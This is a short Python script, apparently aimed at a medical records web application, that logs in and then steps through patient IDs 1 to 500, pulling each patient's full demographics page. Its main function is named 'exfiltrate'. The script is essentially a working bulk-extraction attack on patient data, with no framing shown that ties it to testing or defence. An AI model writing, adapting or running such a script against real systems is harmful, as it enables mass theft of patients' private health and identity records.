#!/usr/bin/env python3
import requests
import time

TARGET   = "http://192.168.1.10"
USERNAME = ""
PASSWORD = ""

PATIENT_URL_TEMPLATE = TARGET + "/interface/patient_file/summary/demographics_full.php?pid={pid}"
NUM_RECORDS = 500
DELAY       = 0.05

session = requests.Session()

def login():
    resp = session.post(
        f"{TARGET}/interface/main/main_screen.php?auth=login&site=default",
        data={
            "new_login_session_management": "1",
            "languageChoice": "1",
            "authUser": USERNAME,
            "clearPass": PASSWORD,
        },
    )
    if "error=1" in resp.text:
        print("Login may have failed — check credentials.")
    else:
        print("Logged in successfully.")

def exfiltrate():
    print(f"Pulling up to {NUM_RECORDS} patient records...")
    total_bytes = 0
    for pid in range(1, NUM_RECORDS + 1):
        try:
            resp = session.get(PATIENT_URL_TEMPLATE.format(pid=pid), timeout=5)
            total_bytes += len(resp.content)
            print(f"[{pid}/{NUM_RECORDS}] {resp.status_code} — {len(resp.content)} bytes (total: {total_bytes})")
        except requests.RequestException as e:
            print(f"[{pid}] error: {e}")
        time.sleep(DELAY)
    print(f"\nDone. Approx {total_bytes} bytes transferred.")

if __name__ == "__main__":
    login()
    exfiltrate()
